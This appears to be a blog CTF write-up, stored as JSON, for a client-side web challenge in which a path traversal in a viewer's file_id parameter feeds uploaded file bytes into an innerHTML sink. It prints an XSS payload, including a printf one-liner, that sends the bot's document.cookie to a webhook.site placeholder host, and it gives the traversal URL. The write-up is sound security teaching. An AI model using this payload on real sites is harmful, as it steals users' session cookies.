@@ -1,0 +1,254 @@
+{
+  "id": "small-image-uploader",
+  "title": "Small Image Uploader",
+  "slug": "small-image-uploader",
+  "category": "ctf",
+  "tags": ["web", "xss", "path-traversal", "client-side"],
+  "difficulty": "Easy",
+  "date": "2026-07-21",
+  "platform": "AlpacaHack",
+  "summary": "A client-side challenge that looks like a plain image uploader. Two endpoints that are both dead ends on their own get chained through a client-side path traversal into an innerHTML sink, turning uploaded file bytes into stored XSS that steals the admin bot's flag cookie.",
+  "content": [
+    {
+      "type": "image",
+      "src": "/screenshots/small-image-uploader/img7.png",
+      "alt": "Small Image Uploader — Daily AlpacaHack, Topic: Client-Side, Hard (6.5), 75 solves"
+    },
+    {
+      "type": "paragraph",
+      "text": "Ok this challenge has 2 servers, one for the app and the other for the bot. Its whole point is XSS with a \"small image\". It provides the source code of both, which makes things easier."
+    },
+    {
+      "type": "paragraph",
+      "text": "- the **app** is an image uploader (called *KiloFile* — \"share tiny images fast, up to 1KB\").\n- the **bot** server: we provide a link to it and it visits that link with the flag sitting in a cookie."
+    },
+    {
+      "type": "paragraph",
+      "text": "So the plan writes itself: inject an XSS payload that reads the bot's cookie and sends it to a webhook."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Recon — where's the flag?"
+    },
+    {
+      "type": "paragraph",
+      "text": "First thing i do is search for the location of the flag and how it's processed:"
+    },
+    {
+      "type": "code",
+      "language": "javascript",
+      "code": "const FLAG = process.env.FLAG ?? \"Alpaca{REDACTED}\";\nconst APP_URL = process.env.APP_URL ?? \"http://localhost:8080/\";\n\nexport const visit = async (url) => {\n  ...\n  await browser.setCookie({\n    \"name\": \"flag\",\n    \"value\": FLAG,\n    \"domain\": new URL(APP_URL).hostname,\n    \"path\": \"/\",\n  })"
+    },
+    {
+      "type": "paragraph",
+      "text": "We see here that the flag is set as a cookie on the bot's browser, scoped to the app's domain. cool."
+    },
+    {
+      "type": "paragraph",
+      "text": "And we see here:"
+    },
+    {
+      "type": "code",
+      "language": "javascript",
+      "code": "const page = await browser.newPage();\nawait page.goto(url, { timeout: 5000 });\nawait sleep(5000);\nawait page.close();"
+    },
+    {
+      "type": "paragraph",
+      "text": "The bot visits a url that we provide to it. eeazy — we connect the dots: a service that uploads images, and a bot that visits urls we give it."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "First attempt (the naive payload)"
+    },
+    {
+      "type": "paragraph",
+      "text": "The upload only accepts some image extensions:"
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "if ext not in [\".png\", \".jpg\", \".jpeg\", \".gif\"]:\n    return jsonify({\"error\": \"Invalid extension\"}), 400"
+    },
+    {
+      "type": "paragraph",
+      "text": "So we try this simple payload and save it as `payload.gif`:"
+    },
+    {
+      "type": "code",
+      "language": "html",
+      "code": "<img src=\"xxx\" onerror=\"fetch('https://webhook.site/YOUR_ID/flag?cookie=' + document.cookie)\">"
+    },
+    {
+      "type": "paragraph",
+      "text": "We upload it:"
+    },
+    {
+      "type": "image",
+      "src": "/screenshots/small-image-uploader/img1.png",
+      "alt": "Uploading the payload.gif on the KiloFile upload page"
+    },
+    {
+      "type": "paragraph",
+      "text": "We open the viewer at `/file?file_id=<file_id>`:"
+    },
+    {
+      "type": "image",
+      "src": "/screenshots/small-image-uploader/img2.png",
+      "alt": "The viewer showing the plain filename instead of running the payload"
+    },
+    {
+      "type": "paragraph",
+      "text": "Nothing to display. ok i tried sending it to the bot, nothing happened — let's read the source."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Reading the backend"
+    },
+    {
+      "type": "image",
+      "src": "/screenshots/small-image-uploader/img3.png",
+      "alt": "Backend source for /api/file and /api/filename"
+    },
+    {
+      "type": "paragraph",
+      "text": "There are 2 endpoints here:"
+    },
+    {
+      "type": "paragraph",
+      "text": "**`/api/filename/<file_id>`** — the one behind the viewer. It only returns `file_infos[file_id][\"original_filename\"]` as plain text. That's why our payload never ran — it's just the filename string, not the file content. And worse (for us), on upload the filename is stored **HTML-escaped**:"
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "file_infos[file_id] = {\n    \"original_filename\": html.escape(original_filename),\n    \"path\": path,\n}"
+    },
+    {
+      "type": "paragraph",
+      "text": "so we can't even smuggle XSS through the filename itself — it gets escaped."
+    },
+    {
+      "type": "paragraph",
+      "text": "**`/api/file/<file_id>`** — serves the raw uploaded bytes with `mimetype=\"application/octet-stream\"` and `X-Content-Type-Options: nosniff`. If you just point the bot **straight at this URL**, it won't execute — octet-stream + `nosniff` means the browser can't sniff the bytes into `text/html`, it just downloads them. So *as a direct navigation target* this endpoint is a dead end. (This is exactly why the obvious \"upload HTML, send the bot to `/api/file/<id>`\" attempt goes nowhere.) But keep it in mind — those raw bytes are still our payload; we just need something else to pull them into an HTML context for us."
+    },
+    {
+      "type": "paragraph",
+      "text": "So neither endpoint is exploitable **on its own**: one escapes everything, the other can't be rendered as HTML directly. The bug only appears when we make one endpoint feed the other."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "The frontend sink"
+    },
+    {
+      "type": "paragraph",
+      "text": "ok let's have a look at the frontend, how it processes the data:"
+    },
+    {
+      "type": "image",
+      "src": "/screenshots/small-image-uploader/img4.png",
+      "alt": "Viewer page + devtools showing the frontend script"
+    },
+    {
+      "type": "code",
+      "language": "javascript",
+      "code": "previewEl.src = `/api/file/${fileId}`;\nfetch(`/api/filename/${fileId}`)\n  .then((res) => (res.ok ? res.text() : null))\n  .then((data) => {\n    filenameEl.innerHTML = `<i>Filename: ${data}</i>`;\n  });"
+    },
+    {
+      "type": "paragraph",
+      "text": "Whatever text comes back from `/api/filename/<file_id>` gets dumped straight into `innerHTML`. soooooo we have an XSS sink, bingoo. Problem is, that endpoint only ever returns the stored filename string (escaped), never our payload's actual content."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "The key insight — chaining a path traversal"
+    },
+    {
+      "type": "paragraph",
+      "text": "So how do we get the filename endpoint to hand us the **file content** instead of the filename? very eeaasy — **path traversal**."
+    },
+    {
+      "type": "paragraph",
+      "text": "`fileId` comes straight from the URL and is concatenated into the fetch path with zero sanitizing. So if we point `fileId` at the *other* endpoint's file, the browser normalizes the URL before it even sends it:"
+    },
+    {
+      "type": "code",
+      "language": "text",
+      "code": "fileId = ../file/<FILE_ID>\nfetch(`/api/filename/${fileId}`)  →  /api/filename/../file/<FILE_ID>  →  /api/file/<FILE_ID>"
+    },
+    {
+      "type": "paragraph",
+      "text": "The `..` walks the fetch back up to `/api/file/<FILE_ID>`, which returns the **raw bytes of our uploaded file** — our XSS payload — and *that* is what lands in `innerHTML`."
+    },
+    {
+      "type": "note",
+      "noteType": "info",
+      "text": "And here's the part that trips people up: this is the same `/api/file` endpoint that was a dead end a minute ago. The `octet-stream` + `nosniff` combo only stops the browser from executing the file when it *renders* it (direct navigation, `<img>`, `<script>`). Here we never ask the browser to render it — the viewer's own JS does `fetch(...).text()`, which hands us the body as a plain string no matter what Content-Type it carried, and then we shove that string into `innerHTML` ourselves. Content-Type and `nosniff` are completely bypassed the moment the response is read as text and re-parsed as HTML. So `/api/file` was never useless — it was always holding our payload; it just needed the filename endpoint (via traversal) to smuggle it into a sink."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Exploit"
+    },
+    {
+      "type": "paragraph",
+      "text": "**1. Save the payload** as a `.gif`:"
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "code": "printf '<img src=\"xxx\" onerror=\"fetch(\\'https://webhook.site/YOUR_ID/flag?cookie=\\'+document.cookie)\">' > payload.gif"
+    },
+    {
+      "type": "paragraph",
+      "text": "**2. Upload it** and grab the returned `file_id`:"
+    },
+    {
+      "type": "image",
+      "src": "/screenshots/small-image-uploader/img5.png",
+      "alt": "Upload of the traversal payload"
+    },
+    {
+      "type": "paragraph",
+      "text": "**3. Point the viewer's `file_id` at the file endpoint via traversal:**"
+    },
+    {
+      "type": "code",
+      "language": "text",
+      "code": "file?file_id=../file/<FILE_ID>"
+    },
+    {
+      "type": "paragraph",
+      "text": "**4. Send that path to the bot** (the bot prepends `APP_URL = http://web:3000/`):"
+    },
+    {
+      "type": "image",
+      "src": "/screenshots/small-image-uploader/img6.png",
+      "alt": "Admin bot report form with the traversal payload url"
+    },
+    {
+      "type": "note",
+      "noteType": "success",
+      "text": "**5. FLAAG IN WEBHOOK** — the bot loads the viewer, the traversal pulls our payload bytes out of `/api/file` and into `innerHTML`, the `onerror` fires in the bot's session, and the flag cookie lands in the webhook."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Root cause"
+    },
+    {
+      "type": "paragraph",
+      "text": "Two separate weak points chained together:"
+    },
+    {
+      "type": "paragraph",
+      "text": "1. **No path-traversal sanitization on `file_id`** — it's concatenated straight into the fetch URL, so `../` reroutes the request from the filename endpoint to the file endpoint.\n2. **The frontend trusts whatever string `/api/filename` returns** enough to shove it straight into `innerHTML`."
+    },
+    {
+      "type": "paragraph",
+      "text": "Neither endpoint is exploitable alone: `/api/file` is `nosniff`'d so the browser won't execute it directly, and `/api/filename` normally only returns a short, HTML-escaped filename. The traversal is what lets our raw file content sneak out through the filename endpoint and land in the `innerHTML` sink."
+    }
+  ]
+}
